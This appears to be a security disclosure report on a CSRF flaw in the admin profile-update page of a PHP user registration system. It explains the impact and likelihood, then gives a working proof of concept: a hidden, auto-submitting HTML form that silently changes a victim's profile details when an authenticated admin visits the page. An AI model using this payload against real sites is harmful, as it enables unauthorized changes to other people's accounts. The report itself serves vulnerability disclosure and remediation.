# Vulnerability Report: CSRF in Profile Update


## Vulnerability ID: 2025-10-04 - CSRF-Profile-Update (High)


### Impact
Cross-Site Request Forgery (CSRF) vulnerabilities allow an attacker to perform unauthorized actions on behalf of an authenticated user without their consent. In this case, an attacker can change sensitive user profile details such as **first name, last name, and contact number**, potentially leading to impersonation, fraud, or account confusion.


### Likelihood
High — The profile update endpoint does not implement CSRF protection mechanisms such as anti-CSRF tokens, and there is no evidence of SameSite cookie restrictions or Referer/Origin validation. An attacker can craft a simple HTML page that triggers the update when visited by an authenticated user.


### Risk Level
**High** — Profile-tampering can be used for social-engineering, account takeover workflows, or to hide or disrupt user access.


### Found In
`https://192.168.31.97/User-Registration-and-login-System-with-admin-panel/loginsystem/admin/edit-profile.php?uid=1`


### Vulnerability Description
Web applications must ensure that state-changing requests are intentionally initiated by their legitimate users. However, during the security review, it was found that the profile update endpoint (`edit-profile.php`) accepts POST requests that modify user profile details without validating an anti-CSRF token or checking the Origin/Referer headers. The server responds with a successful update message and redirects to the user management page. This lack of CSRF protection increases the attack surface and allows a remote attacker to force authenticated administrators or users visiting a malicious page to update profile data silently.


### Proof of Concept (PoC)
The following PoC demonstrates how an attacker can change the contact number to `1111111111`. Host this HTML and lure an authenticated user (admin) to visit it. The form auto-submits and updates the profile for `uid=1`.


**PoC HTML (also included in `poc/csrf_profile_update.html`):**


```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<form action="https://192.168.31.97/User-Registration-and-login-System-with-admin-panel/loginsystem/admin/edit-profile.php?uid=1" method="POST">
<input type="hidden" name="fname" value="Rahul" />
<input type="hidden" name="lname" value="Kumarrr" />
<input type="hidden" name="contact" value="1111111111" />
<input type="hidden" name="update" value="" />
<input type="submit" value="Submit request" />
</form>
<script>
history.pushState('', '', '/');
document.forms[0].submit();
</script>
</body>
</html>
